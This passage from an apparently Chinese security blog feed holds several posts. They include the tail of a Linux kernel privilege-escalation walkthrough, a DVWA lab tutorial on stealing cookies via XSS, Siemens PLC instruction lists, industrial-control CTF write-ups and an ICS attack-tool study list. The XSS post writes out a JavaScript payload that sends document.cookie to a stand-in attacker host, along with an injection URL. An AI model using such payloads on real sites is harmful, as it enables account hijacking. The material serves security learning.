successful"><br>接下来单步进入我们的payload。<br><img src="\images\pasted-283.png" alt="upload successful"><br>这里可以看到先去执行commit_creds(prepare_kernel_cred(0))了。<br><img src="\images\pasted-284.png" alt="upload successful"><br>我们主要关注iret。<br><img src="\images\pasted-285.png" alt="upload successful"><br>红色部分就是我们伪造的tf结构。<br><img src="\images\pasted-286.png" alt="upload successful"><br>这边可以看到eip指向是我们用来起shell的函数，这样看来整个payload结构是没什么问题的。<br><img src="\images\pasted-287.png" alt="upload successful"><br>成功拿到root shell。</p>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux内核漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>XSS打cookie</title>
      <link href="/2018/08/07/XSS%E6%89%93cookie/"/>
      <url>/2018/08/07/XSS%E6%89%93cookie/</url>
      <content type="html"><![CDATA[<p>如果web应用在用户输入的地方没有过滤特殊字符，比如&lt;, &gt;, ‘, “, &lt; script&gt;, javascript 等字符，而且在变量输出的地方没有使用安全的编码函数，比如PHP的htmlentities()和htmlspecialchars()函数，JavaScript中的escapeJavascript函数，这样的web应用极易出现XSS漏洞。XSS攻击的危害主要有盗取用户cookie、跳转到恶意网站等，危害巨大，常年居Owasp top 10前三。  </p><p>为了理解XSS盗取cookie的原理，进行实验。实验需准备：<br>1）两台主机，主机A（IP地址为IPa）的用户正在浏览具有XSS的网站，主机B（IP地址为IPb）运行着攻击者的恶意代码。<br>(2)DVWA安全等级设为low，充当具有XSS漏洞的网站。<br>攻击者先上传一个JavaScript脚本到主机B上，即xss payload，这段脚本命名为evil.js，可以这样写：  </p><pre><code>var img = document.createElement(&quot;img&quot;);img.src = &quot;http://IPb/log?&quot;+escape(document.cookie);document.body.appendChild(img);</code></pre><p>这段代码将document.cookie作为对象传到主机B上。<a href="http://IPb/log可以存在，也可以不存在，因为这个请求会在主机B的服务器日志中留下日志。" target="_blank" rel="noopener">http://IPb/log可以存在，也可以不存在，因为这个请求会在主机B的服务器日志中留下日志。</a>  </p><p>主机A打开DVWA网站的XSS选项，在what’s your name输入框输入：&lt;script src=<a href="http://IPb/evil.js" target="_blank" rel="noopener">http://IPb/evil.js</a> &gt;并提交：<br><img src="\images\pasted-316.png" alt="upload successful"><br>此时主机A的cookie值就会发送到主机B上，查看主机B的web日志：<br>发现主机A的cookie值已经存在web日志里了。<br><img src="\images\pasted-317.png" alt="upload successful"><br>虽然是实验，但是如果DVWA有XSS漏洞，而攻击者构造一个<a href="http://IP/DVWA/vulnerabilities/xss_r/?name=%3Cscript+src%3Dhttp%3A%2F%2FIPb%2Fevil.js+%3E%3C%2Fscript%3E#" target="_blank" rel="noopener">http://IP/DVWA/vulnerabilities/xss_r/?name=%3Cscript+src%3Dhttp%3A%2F%2FIPb%2Fevil.js+%3E%3C%2Fscript%3E#</a> ，诱骗了用户点击，那么用户的cookie就会发到主机B上，攻击者就可以登录受害者的账户了。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Xss </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>西门子PLC指令表</title>
      <link href="/2018/08/05/%E8%A5%BF%E9%97%A8%E5%AD%90PLC%E6%8C%87%E4%BB%A4%E8%A1%A8/"/>
      <url>/2018/08/05/%E8%A5%BF%E9%97%A8%E5%AD%90PLC%E6%8C%87%E4%BB%A4%E8%A1%A8/</url>
      <content type="html"><![CDATA[<h1 id="位逻辑指令"><a href="#位逻辑指令" class="headerlink" title="位逻辑指令"></a>位逻辑指令</h1><p><img src="\images\pasted-221.png" alt="upload successful"><br><br><br></p><h1 id="时钟指令"><a href="#时钟指令" class="headerlink" title="时钟指令"></a>时钟指令</h1><p><img src="\images\pasted-222.png" alt="upload successful"><br><br><br></p><h1 id="通信指令"><a href="#通信指令" class="headerlink" title="通信指令"></a>通信指令</h1><p><img src="\images\pasted-223.png" alt="upload successful"><br><br><br></p><h1 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h1><p><img src="\images\pasted-224.png" alt="upload successful"><br><br><br></p><h1 id="转换指令"><a href="#转换指令" class="headerlink" title="转换指令"></a>转换指令</h1><p><img src="\images\pasted-225.png" alt="upload successful"><br><br><br></p><h1 id="计数器指令"><a href="#计数器指令" class="headerlink" title="计数器指令"></a>计数器指令</h1><p><img src="\images\pasted-226.png" alt="upload successful"><br><br><br></p><h1 id="浮点数运算指令"><a href="#浮点数运算指令" class="headerlink" title="浮点数运算指令"></a>浮点数运算指令</h1><p><img src="\images\pasted-227.png" alt="upload successful"><br><br><br></p><h1 id="整数运算指令"><a href="#整数运算指令" class="headerlink" title="整数运算指令"></a>整数运算指令</h1><p><img src="\images\pasted-228.png" alt="upload successful"><br><br><br></p><h1 id="中断指令"><a href="#中断指令" class="headerlink" title="中断指令"></a>中断指令</h1><p><img src="\images\pasted-229.png" alt="upload successful"><br><br><br></p><h1 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h1><p><img src="\images\pasted-230.png" alt="upload successful"><br><br><br></p><h1 id="程序控制指令"><a href="#程序控制指令" class="headerlink" title="程序控制指令"></a>程序控制指令</h1><p><img src="\images\pasted-231.png" alt="upload successful"><br><br><br></p><h1 id="传送指令"><a href="#传送指令" class="headerlink" title="传送指令"></a>传送指令</h1><p><img src="\images\pasted-232.png" alt="upload successful"><br><br><br></p><h1 id="移位指令"><a href="#移位指令" class="headerlink" title="移位指令"></a>移位指令</h1><p><img src="\images\pasted-233.png" alt="upload successful"><br><br><br></p><h1 id="字符串指令"><a href="#字符串指令" class="headerlink" title="字符串指令"></a>字符串指令</h1><p><img src="\images\pasted-234.png" alt="upload successful"><br><br><br></p><h1 id="表指令"><a href="#表指令" class="headerlink" title="表指令"></a>表指令</h1><p><img src="\images\pasted-235.png" alt="upload successful"><br><br><br></p><h1 id="定时器指令"><a href="#定时器指令" class="headerlink" title="定时器指令"></a>定时器指令</h1><p><img src="\images\pasted-236.png" alt="upload successful"><br><br><br></p>]]></content>
      
      <categories>
          
          <category> 工控安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ICS </tag>
            
            <tag> plc </tag>
            
            <tag> 梯形图 </tag>
            
            <tag> 西门子 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>西门子PLC梯形图说明</title>
      <link href="/2018/08/05/%E8%A5%BF%E9%97%A8%E5%AD%90PLC%E6%A2%AF%E5%BD%A2%E5%9B%BE%E8%AF%B4%E6%98%8E/"/>
      <url>/2018/08/05/%E8%A5%BF%E9%97%A8%E5%AD%90PLC%E6%A2%AF%E5%BD%A2%E5%9B%BE%E8%AF%B4%E6%98%8E/</url>
      <content type="html"><![CDATA[<h1 id="位逻辑指令"><a href="#位逻辑指令" class="headerlink" title="位逻辑指令"></a>位逻辑指令</h1><pre><code>1.1  位逻辑指令概述1.2  -||- 常开接点(地址)1.3  -|/|-常闭接点(地址)1.4  XOR位异或1.5  -|NOT|- 信号流反向1.6  -( ) 输出线圈1.7  -(#)- 中间输出1.8  -(R) 线圈复位1.9  -(S) 线圈置位1.10  RS复位置位触发器1.11  RS置位复位触发器1.12  -(N)-RLO下降沿检测1.13  -(P)-PLO上升沿检测1.14  -(SAVE) 将RLO存入BR存储器1.15  MEG地址下降沿检测1.16  POS地址上升沿检测1.17  立即读操作1.18  立即写操作</code></pre><p><br><br></p><h1 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h1><pre><code>2.1  比较指令概述2.2  CMP?I整数比较2.3  CMP?D双整数比较2.4  CMP?R实数比较</code></pre><p><br><br></p><h1 id="转换指令"><a href="#转换指令" class="headerlink" title="转换指令"></a>转换指令</h1><pre><code>3.1   转换指令概述3.2   BCD_IBCD码转换为整数3.3   I_BCD整数转换为BCD码3.4   I_DINT整数转换为双整数3.5   BCD_DIBCD码转换为双整数3.6   DI_BCD双整数转换为BCD码3.7   DI_REAL双整数转换为浮点数3.8   INV_I整数的二进制反码3.9   INV_DI双整数的二进制反码3.10   NEG_I整数的二进制补码3.11   NEG_DI双整数的二进制补码3.12   NEG_R浮点数求反3.13   ROUND舍入为双整数3.14   TRUNC舍去小数取整为双整数3.15   CEIL上取整3.16   FLOOR下取整</code></pre><p><br><br></p><h1 id="计数器指令"><a href="#计数器指令" class="headerlink" title="计数器指令"></a>计数器指令</h1><pre><code>4.1  计数器指令概述4.2  S_CUD加减计数4.3  S_CU加计数器4.4  S_CD减计数器4.5  -(SC)计数器置初值4.6  -(CU)加计数器线圈4.7  -(CD)减计数器线圈</code></pre><p><br><br></p><h1 id="数据块指令"><a href="#数据块指令" class="headerlink" title="数据块指令"></a>数据块指令</h1><pre><code>5.1  -(OPN)打开数据块:DB或DI</code></pre><p><br><br></p><h1 id="逻辑控制指令"><a href="#逻辑控制指令" class="headerlink" title="逻辑控制指令"></a>逻辑控制指令</h1><pre><code>6.1  逻辑控制指令概述6.2  -(JMP)- 无条件跳转6.3  -(JMP)- 条件跳转6.4  -(JMPN)- 若非则跳转6.5  LABEL标号</code></pre><p><br><br></p><h1 id="整数算术运算指令"><a href="#整数算术运算指令" class="headerlink" title="整数算术运算指令"></a>整数算术运算指令</h1><pre><code>7.1  整数算术运算指令概述7.2  判断整数算术运算指令后状态字的位7.3  ADD_I 整数加法7.4  SUB_I 整数减法7.5  MUL_I 整数乘法7.6  DIV_I 整数除法7.7  ADD_DI 双整数加法7.8  SUB_DI 双整数减法7.9  MUL_DI 双整数乘法7.10  DIV_DI 双整数除法7.11  MOD_DI 回送余数的双整数</code></pre><p><br><br></p><h1 id="浮点算术运算指令"><a href="#浮点算术运算指令" class="headerlink" title="浮点算术运算指令"></a>浮点算术运算指令</h1><pre><code>8.1  浮点算术运算指令概述8.2  判断浮点算术运算指令后状态字的位8.3  基础指令8.3.1  ADD_R实数加法8.3.2  SUB_R实数减法8.3.3  MUL_R实数乘法8.3.4  DIV_R实数除法8.3.5  ABS浮点数绝对值运算8.4  扩展指令8.4.1  SQR浮点数平方8.4.2  SQRT浮点数平方根8.4.3  EXP浮点数指数运算8.4.4  LN浮点数自然对数运算8.4.5  SIN浮点数正弦运算8.4.6  COS浮点数余弦运算8.4.7  TAN浮点数正切运算8.4.8  ASIN浮点数反正弦运算8.4.9  ACOS浮点数反余弦运算8.4.10  ATAN浮点数反正切运算</code></pre><p><br><br></p><h1 id="赋值指令"><a href="#赋值指令" class="headerlink" title="赋值指令"></a>赋值指令</h1><pre><code>9.1   MOVE赋值</code></pre><p><br><br></p><h1 id="程序控制指令"><a href="#程序控制指令" class="headerlink" title="程序控制指令"></a>程序控制指令</h1><pre><code>10.1  程序控制指令概述10.2  -(Call)从线圈调用FC/SFC(无参数)10.3  CALL_FB从方块调用FB10.4  CALL_FC从方块调用FC10.5  CALL_SFB从方块调用SFB10.6  CALL_SFC从方块调用SFC10.7  调用多北京块10.8  从库中调用块10.9  使用MCR功能的重要注意事项10.10  -(MCR&lt;)主控继电器接通10.11  -(MCR&gt;)主控继电器断开10.12  -(MCRA)主控继电器启动10.13  -(MCRD)主控继电器停止10.14  -(RET)返回</code></pre><p><br><br></p><h1 id="移位和循环指令"><a href="#移位和循环指令" class="headerlink" title="移位和循环指令"></a>移位和循环指令</h1><pre><code>11.1   移位指令11.1.1   移位指令概述11.1.2   SHR_I整数右移11.1.3   SHR_DI双整数右移11.1.4   SHL_W字左移11.1.5   SHR_W字右移11.1.6   SHL_DW双字左移11.1.7   SHR_DW双字右移11.2   循环指令11.2.1   循环指令概述11.2.2   ROL_DW双字左循环11.2.3   ROR_DW双字右循环</code></pre><p><br><br></p><h1 id="状态位指令"><a href="#状态位指令" class="headerlink" title="状态位指令"></a>状态位指令</h1><pre><code>12.1   状态位指令概述12.2   OV -||- 溢出异常位12.3   OS -||- 存储溢出异常位12.4   UO -||- 无序异常位12.5   BR -||- 异常位二进制结果12.6   ==0-||- 结果位等于&quot;0&quot;12.7   &lt;&gt;0-||- 结果位不等于&quot;0&quot;12.8   &gt;0-||- 结果位大于&quot;0&quot;12.9   &lt;0-||- 结果位小于&quot;0&quot;12.10   &gt;=0-||- 结果位大于等于&quot;0&quot;12.11   &lt;=0-||- 结果位小于等于&quot;0&quot;</code></pre><p><br><br></p><h1 id="定时器指令"><a href="#定时器指令" class="headerlink" title="定时器指令"></a>定时器指令</h1><pre><code>13.1   定时器指令概述13.2   存储区中定时器的存储单元和定时器的组成部分13.3   S_PULSE脉冲S5定时器13.4   S_PEXT扩展脉冲S5定时器13.5   S_ODT接通延时S5定时器13.6   S_ODTS保持型接通延时S5定时器13.7   S_OFFDT断电延时S5定时器13.8   -(SP)脉冲定时器线圈13.9   -(SE)扩展脉冲定时器线圈13.10   -(SD)接通延时定时器线圈13.11   -(SS)保持型接通延时定时器线圈13.12   -(SF)断开延时定时器线圈</code></pre><p><br><br></p><h1 id="字逻辑指令"><a href="#字逻辑指令" class="headerlink" title="字逻辑指令"></a>字逻辑指令</h1><pre><code>14.1   字逻辑指令概述14.2   WAND_W字和字相&quot;与&quot;14.3   WOR_W字和字相&quot;或&quot;14.4   WAND_DW双字和双字相&quot;与&quot;14.5   WOR_DW双字和双字相&quot;或&quot;14.6   WXOR_W字和字相&quot;异或&quot;14.7   WXOR_DW双字和双字相&quot;异或</code></pre><p><br><br></p>]]></content>
      
      <categories>
          
          <category> 工控安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ICS </tag>
            
            <tag> plc </tag>
            
            <tag> 梯形图 </tag>
            
            <tag> 西门子 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>梯形图计算writeup</title>
      <link href="/2018/08/05/%E6%A2%AF%E5%BD%A2%E5%9B%BE%E8%AE%A1%E7%AE%97writeup/"/>
      <url>/2018/08/05/%E6%A2%AF%E5%BD%A2%E5%9B%BE%E8%AE%A1%E7%AE%97writeup/</url>
      <content type="html"><![CDATA[<p><strong><em>2018年工业信息安全技能大赛(华中赛区)</em></strong>两道梯形图计算题，请教了学弟记录一下write up</p><h1 id="梯形图计算1"><a href="#梯形图计算1" class="headerlink" title="梯形图计算1"></a>梯形图计算1</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><strong><em>分析当M0.0=1时，PLC程序的运算结果为多少？</em></strong></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="\images\pasted-210.png" alt="upload successful"><br><img src="\images\pasted-211.png" alt="upload successful"><br>全都是Q0.1决定的，所以Q0.1肯定是1。<br>程序段3这里是模拟信号5.045000<em>10^001=50.45<br>程序段3这里是模拟信号4.000000</em>10^001=40<br>OUT为50.45<em>40=2018<br>flag是**</em>2018***<br><br><br><br></p><h1 id="梯形图计算2"><a href="#梯形图计算2" class="headerlink" title="梯形图计算2"></a>梯形图计算2</h1><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p><strong><em>分析当M10.0=1时，PLC程序的运算结果为多少？</em></strong><br><img src="\images\pasted-212.png" alt="upload successful"><br><img src="\images\pasted-213.png" alt="upload successful"><br><img src="\images\pasted-214.png" alt="upload successful"><br><img src="\images\pasted-215.png" alt="upload successful"></p><h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p><img src="\images\pasted-216.png" alt="upload successful"><br><img src="\images\pasted-217.png" alt="upload successful"><br><img src="\images\pasted-218.png" alt="upload successful"><br><strong><em>逆向分析</em></strong><br>先看程序段4，求Tag_10,是由Tag_9和Tag_8决定的，并且Tag_2一定是1，Tag_8，Tag_9是SWAP的关系  <em><br>再看程序段3，Tag_8 = Tag_7 </em> 100<br>再看程序段2，Tag_7 = Tag_4<br>再看程序段2，Tag_4 = 5<br>可以推出：<br>Tag_4：5<br>Tag_7：5<br>Tag_8：500==0x01f4==0000000111110100<br>Tag_9：0xf401==1111010000000001<br><img src="\images\pasted-220.png" alt="upload successful"><br>Tag_10：<strong><em>5f5f</em></strong><br><br><br><br></p>]]></content>
      
      <categories>
          
          <category> 工控安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ICS </tag>
            
            <tag> write up </tag>
            
            <tag> plc </tag>
            
            <tag> 梯形图 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>工控流量分析writeup</title>
      <link href="/2018/08/04/%E5%B7%A5%E6%8E%A7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90writeup/"/>
      <url>/2018/08/04/%E5%B7%A5%E6%8E%A7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90writeup/</url>
      <content type="html"><![CDATA[<p><strong><em>2018年工业信息安全技能大赛(华中赛区)</em></strong>的几道流量分析题，抽时间写一下write up<br><br><br><br></p><h1 id="工业协议分析3"><a href="#工业协议分析3" class="headerlink" title="工业协议分析3"></a>工业协议分析3</h1><p>先过滤modbus的包，保存为分组字节流502.pcap<br><img src="\images\pasted-193.png" alt="upload successful"><br>再用流量分析脚本（ics_packet_analysis.py），按照数据包长度分流，可以吧不同长度的数据包分处理，方便分析<br><img src="\images\pasted-194.png" alt="upload successful"><br><img src="\images\pasted-195.png" alt="upload successful"><br>直接打印出了这个数据包且将这个数据包以pcap的形式存储下来，用wireshark打开，分析可知这个长度全部都是Wirte Multiple Register功能的包，仔细分析一下<br><img src="\images\pasted-196.png" alt="upload successful"><br>发现可以字符串，modbus中通信是一发一收，不可能有连续的可见数据，可判断这就是恶意流量<br><img src="\images\pasted-197.png" alt="upload successful"><br>尝试16进制解密字符串，拿到flag<br><img src="\images\pasted-198.png" alt="upload successful"><br><br><br><br></p><h1 id="工业协议分析4"><a href="#工业协议分析4" class="headerlink" title="工业协议分析4"></a>工业协议分析4</h1><p>由于流量脚本分析工具只能识别pcap包，所以这里要转换一下<br>wireshark打开，导出特定分组字节，保存位pcap格式即可<br>顺便在过滤一下与工控流量无关的包<br><img src="\images\pasted-199.png" alt="upload successful"><br>继续用流量分析脚本工具，分流，分析<br><img src="\images\pasted-200.png" alt="upload successful"><br>分析一下，例如长度为40的包 没有数据，所以不是要分析的modbus的包，我们来看长度为52的这个包packets_52.pcap<br><img src="\images\pasted-201.png" alt="upload successful"><br>有Read Coils，Read Holiding Registers，Read Input Register三种功能的包，但都是正常的寄存器读写操作，没有异常流量<br>再看长度为115的包，是s7comm协议<br>追踪TCP流，转为Hex去看，然后找不到……<br>回过头在分组字节流重新找，找到有一个重传的异常包<br><img src="\images\pasted-202.png" alt="upload successful"><br>16进制解码4943532657696e7365637572697479，拿到flag<br><img src="\images\pasted-203.png" alt="upload successful"><br><br><br><br></p><h1 id="电力系统协议分析"><a href="#电力系统协议分析" class="headerlink" title="电力系统协议分析"></a>电力系统协议分析</h1><p>直接追踪流，转为Hex转储分析<br>分析可知，这里似乎列出一个文件目录<br><img src="\images\pasted-204.png" alt="upload successful"><br>然后似乎就是一直打开文件，读取文件，关闭文件<br><img src="\images\pasted-205.png" alt="upload successful"><br>这里追踪到可疑文件<br><img src="\images\pasted-206.png" alt="upload successful"><br><img src="\images\pasted-207.png" alt="upload successful"><br><img src="\images\pasted-208.png" alt="upload successful"><br><img src="\images\pasted-209.png" alt="upload successful"><br>flag就是这filedata中的数据<strong><em>61850@102</em></strong><br><br><br><br></p><h1 id="PLC通信协议分析"><a href="#PLC通信协议分析" class="headerlink" title="PLC通信协议分析"></a>PLC通信协议分析</h1><p>这道题问设备地址，私有协议比较难分析，最后也没做出来…<br>后来想想设备地址似乎就两位16进制数，按照比赛要求同一道题两次提交时间间隔30s，也就是说爆破flag似乎也就是只用两个小时…<br>emmm还是我们太乖了…<br><br><br><br></p>]]></content>
      
      <categories>
          
          <category> 工控安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ICS </tag>
            
            <tag> modbus </tag>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>工控学习主要科目</title>
      <link href="/2018/08/03/%E5%B7%A5%E6%8E%A7%E5%AD%A6%E4%B9%A0%E4%B8%BB%E8%A6%81%E7%A7%91%E7%9B%AE/"/>
      <url>/2018/08/03/%E5%B7%A5%E6%8E%A7%E5%AD%A6%E4%B9%A0%E4%B8%BB%E8%A6%81%E7%A7%91%E7%9B%AE/</url>
      <content type="html"><![CDATA[<h1 id="工业控制系统概述"><a href="#工业控制系统概述" class="headerlink" title="工业控制系统概述"></a>工业控制系统概述</h1><p>目的：简单的了解什么是工业控制系统、工业控制系统框架、工业控制系统安全现状等理论基础知识，在对工业控制系统有了一定的了解后在展开实践。<br>学习方法：通过网上搜集相关资料进行学习，最好直接看一些工控安全的相关书籍，书籍里都讲的很清楚。下面推荐几本入门书籍：<br>1.《黑客大曝光：工业控制系统安全》<br>2.《工业控制网络安全技术与实践》<br>3.《S7-300/400 PLC应用技术》<br>4……<br><br><br><br></p><h1 id="工业控制系统的组态和编程"><a href="#工业控制系统的组态和编程" class="headerlink" title="工业控制系统的组态和编程"></a>工业控制系统的组态和编程</h1><p>目的：了解PLC的架构与特点，认识PLC的硬件及网络组态、学习PLC程序的基础编写，使用TIA对S7-300进行硬件组态和PLC编程。<br>学习方法：学会控制器的组态方法，多看说明文档，能够读懂简单的梯形图控制逻辑和其他的基于IEC61131-3的五种工控编程语言，并进行简单的编程，使用真实的PLC设备进行实操，如国内外的PLC，西门子、施耐德、ABB、和利时、大工计控、优稳……（一般入门都是从西门子的PLC开始）设备能够跑起来是第一步，接下来就可以做一些事了。<br><br><br><br></p><h1 id="常用的工业控制系统协议分析"><a href="#常用的工业控制系统协议分析" class="headerlink" title="常用的工业控制系统协议分析"></a>常用的工业控制系统协议分析</h1><p>要求：分析常用的工业以太网协议，如Modbus、S7comm、IEC61850、EtherNet/IP、DNP3、EPA等等协议，了解这些工业以太网协议的协议规范和存在的安全性问题。<br>学习方法：有真实设备的可以直接使用真实设备进行分析、无真实设备的可以从网上下载相关的协议数据包进行离线分析，通过对协议的不断了解，要形成对这些协议的模糊测试工具。<br><br><br><br></p><h1 id="工控软硬件漏洞挖掘"><a href="#工控软硬件漏洞挖掘" class="headerlink" title="工控软硬件漏洞挖掘"></a>工控软硬件漏洞挖掘</h1><p>工业控制系统的漏洞挖掘主要包含三部分，上位机软件漏洞挖掘、工控协议的漏洞挖掘，控制器设备固件漏洞挖掘。其中最简单的是工控协议漏洞挖掘，上手比较快，需要具备一定的工控协议逆向能力，其他两方面需要一定的基础才能精心研究。<br>学习方法：首先对协议进行分析，然后编写模糊测试脚本，最后进行测试和分析。开始研究是可以找一些已有的漏洞，先复现他的攻击过程，在分析器攻击机理，从而能够举一反三，发掘0day漏洞。<br><br><br><br></p><h1 id="工控系统攻击工具使用"><a href="#工控系统攻击工具使用" class="headerlink" title="工控系统攻击工具使用"></a>工控系统攻击工具使用</h1><p>想要做一些工控安全的研究，光靠自己琢磨效率低下，需要借助前人已有的成果进行研究和学习。其中涉及到很多实用的工具，我们需要建立自己的工具集，这里列出一些常用的工具：<br>（1）S7 Client Demo开源的S7协议库”snap7“基础上进行开发的，主要支持西门子的S7-300/s7-400设备，可以直接连接西门子的控制器，获取控制器上的设备信息（如固件版本，块信息等），还可以直接操作控制器的CPU的启停。<br>（2）PLCSCAN、NMAP中的工控设备扫描模块通过探测设备，获取关于设备的供应商类型、模块信息等，目前仅支持S7协议与MODBUS协议。<br>（3）ISF该框架主要使用Python语言开发，集成了ShadowBroker释放的NSA工具Fuzzbunch攻击框架，是一款适合工控漏洞利用的框架。其中集成很多常用的针对工控安全的攻击集。<br>（4）GrassMarlinGRASSMARLIN是一款由美国国家安全局开发的，能够帮助运维工程师在IP网络上发现并编目监控和数据采集系统（SCADA）和工业控制系统（ICS）主机的开源软件工具，也被称为被动网络映射器。其数据源十分多样化，包括PCAP文件、路由器和交换机配置文件、CAM表以及实时网络数据包的捕获。该工具能够自动识别可用网络，生成网络拓扑，实现主机间通信的可视化，还能够展示从主机通信中所提取的元数据。<br>（5）S7-Brute-OfflineS7密码离线暴力破解工具。<br>（6）SCADA_Metasploit_Modules列举了MSF上所有的针对工业控制系统的漏洞脚本。<br>（7）Scada_Password列举了工业控制系统中的常见的用户和密码。<br>（8）SmodModbus模糊测试工具。<br>（9）PLCinject<br>（10）Modscan<br>（11）…<br>这里就不一一列举了，用到的使用自己去找吧，最后我这里给出几个github上对工控资源整合的网站：<br><a href="https://github.com/zhangdebiao/icsmaster" target="_blank" rel="noopener">https://github.com/zhangdebiao/icsmaster</a><br><a href="https://github.com/zhangdebiao/ICS-Security-Tools" target="_blank" rel="noopener">https://github.com/zhangdebiao/ICS-Security-Tools</a><br><a href="https://github.com/zhangdebiao/awesome-industrial-control-system-security" target="_blank" rel="noopener">https://github.com/zhangdebiao/awesome-industrial-control-system-security</a> &emsp;&emsp;&emsp;<a href="http://www.freebuf.com/sectool/174567.html" target="_blank" rel="noopener">FREEBUF</a><br>这几个链接中整合了国内外和工控安全相关的顶会文章，工控系统的利用脚本、常用的攻击工具、工控协议相关的数据包和协议文档等等。<br><br><br><br></p>]]></content>
      
      <categories>
          
          <category> 工控安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ICS </tag>
            
            <tag> 工控安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Modbus学习笔记</title>
      <link href="/2018/08/03/Modbus%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/08/03/Modbus%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h1 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h1><p><img src="\images\pasted-191.png" alt="upload successful"></p><h2 id="校验码"><a href="#校验码" class="headerlink" title="校验码"></a>校验码</h2><p>校验码是由前面的数据通过某种算法得出的，用以检验该组数据的正确性。代码作为数据在向计算机或其它设备进行输入时，容易产生输入错误，为了减少这种输入错误，编码专家发明了各种校验检错方法，并依据这些方法设置了校验码。<br>常用的校验有：累加和校验SUM、字节异或校验XOR、纵向冗余校验LRC、循环冗余校验CRC……<br><img src="\images\pasted-189.png" alt="upload successful"><br><img src="\images\pasted-190.png" alt="upload successful"></p><h2 id="离散量输入"><a href="#离散量输入" class="headerlink" title="离散量输入"></a>离散量输入</h2><p>主要用来读取单个位的数据，如IO的状态；</p><h2 id="线圈"><a href="#线圈" class="headerlink" title="线圈"></a>线圈</h2><p>开关输出信号，主要用来写入单个位的数据，与离散量构成组成对位的操作；</p><h2 id="输入寄存器"><a href="#输入寄存器" class="headerlink" title="输入寄存器"></a>输入寄存器</h2><p>主要用来读取16位，也就是两个字节的数据；</p><h2 id="保持寄存器"><a href="#保持寄存器" class="headerlink" title="保持寄存器"></a>保持寄存器</h2><p>主要用来写入16位的数据。</p><h2 id="PLC"><a href="#PLC" class="headerlink" title="PLC"></a>PLC</h2><p>可编程逻辑控制器，是一种采用一类可编程的存储器，用于其内部存储程序，执行逻辑运算、顺序控制、定时、计数与算术操作等面向用户的指令，并通过数字或模拟式输入/输出控制各种类型的机械或生产过程。</p><h2 id="串口通信"><a href="#串口通信" class="headerlink" title="串口通信"></a>串口通信</h2><p>随着计算机系统的应用和微机网络的发展，通信功能越来越显得重要.这里所说的通信是指计算机与外界的信息交换.因此，通信既包括计算机与外部设备之间，也包括计算机和计算机之间的信息交换.由于串行通信是在一根传输线上一位一位的传送信息，所用的传输线少，并且可以借助现成的电话网进行信息传送，因此，特别适合于远距离传输.对于那些与计算机相距不远的人－机交换设备和串行存储的外部设备如终端、打印机、逻辑分析仪、磁盘等，采用串行方式交换数据也很普遍.在实时控制和管理方面，采用多台微机处理机组成分级分布控制系统中，各 CPU 之间的通信一般都是串行方式.所以串行接口是微机应用系统常用的接口。许多外设和计算机按串行方式进行通信，这里所说的串行方式，是指外设与接口电路之间的信息传送方式，实际上，CPU 与接口之间仍按并行方式工作.</p><h2 id="串口"><a href="#串口" class="headerlink" title="串口"></a>串口</h2><p>串口是计算机上一种非常通用设备通信的协议，不要与通用串行总线Universal Serial Bus（USB）混淆。大多数计算机包含两个基于RS232的串口。串口同时也是仪器仪表设备通用的通信协议；很多GPIB兼容的设备也带有RS-232口。同时，串口通信协议也可以用于获取远程采集设备的数据。<br>串口通信的概念非常简单，串口按位（bit）发送和接收字节。尽管比按字节（byte）的并行通信慢，但是串口可以在使用一根线发送数据的同时用另一根线接收数据。它很简单并且能够实现远距离通信。比如IEEE488定义并行通行状态时，规定设备线总常不得超过20米，并且任意两个设备间的长度不得超过2米；而对于串口而言，长度可达1200米。<br>典型地，串口用于ASCII码字符的传输。通信使用3根线完成：（1）地线，（2）发送，（3）接收。由于串口通信是异步的，端口能够在一根线上发送数据同时在另一根线上接收数据。其他线用于握手，但是不是必须的。串口通信最重要的参数是波特率、数据位、停止位和奇偶校验。对于两个进行通行的端口，这些参数必须匹配：   </p><h3 id="波特率"><a href="#波特率" class="headerlink" title="波特率"></a>波特率</h3><p>这是一个衡量通信速度的参数。它表示每秒钟传送的bit的个数。例如300波特表示每秒钟发送300个bit。当我们提到时钟周期时，我们就是指波特率。例如如果协议需要4800波特率，那么时钟是4800Hz。这意味着串口通信在数据线上的采样率为4800Hz。通常电话线的波特率为14400，28800和36600。波特率可以远远大于这些值，但是波特率和距离成反比。高波特率常常用于放置的很近的仪器间的通信，典型的例子就是GPIB设备的通信。 </p><h3 id="数据位"><a href="#数据位" class="headerlink" 